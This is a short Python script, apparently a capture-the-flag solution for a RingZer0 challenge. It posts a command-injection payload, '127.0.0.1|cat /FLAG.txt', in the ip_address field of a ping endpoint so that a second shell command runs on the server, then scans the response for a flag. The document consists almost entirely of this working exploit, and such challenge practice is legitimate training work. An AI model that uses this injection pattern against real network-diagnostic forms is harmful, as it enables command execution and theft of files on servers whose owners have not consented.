import requests
import re

# Target URL for the ping endpoint
url = "http://challenges.ringzer0team.com:10190/ping"

# Craft payload using pipe operator to execute command after ping
# 127.0.0.1 will be pinged first, then cat /FLAG.txt will execute
payload = "127.0.0.1|cat /FLAG.txt"

# Prepare POST data
post_data = {'ip_address': payload}

# Set required headers
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

try:
    # Send POST request to the vulnerable endpoint
    print(f"[+] Sending POST request to {url}")
    print(f"[+] Payload: ip_address={payload}")
    
    response = requests.post(url, data=post_data, headers=headers, timeout=15)
    
    # Print response details for analysis
    print(f"\n[+] Status Code: {response.status_code}")
    print(f"[+] Content Length: {len(response.text)} bytes")
    
    # Check if response contains any flag pattern
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    
    if flag_matches:
        print(f"\n[!] SUCCESS! Flag found in response:")
        for flag in flag_matches:
            print(f"    {flag}")
    else:
        print(f"\n[!] No flag found in response.")
        print(f"\n[+] Full Response Body:\n{response.text}")
        
        # Also search for any partial flag indicators
        if 'FLAG' in response.text:
            print("\n[!] Found 'FLAG' keyword in response (but not in correct format)")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Error occurred: {e}")
except Exception as e:
    print(f"[-] Unexpected error: {e}")
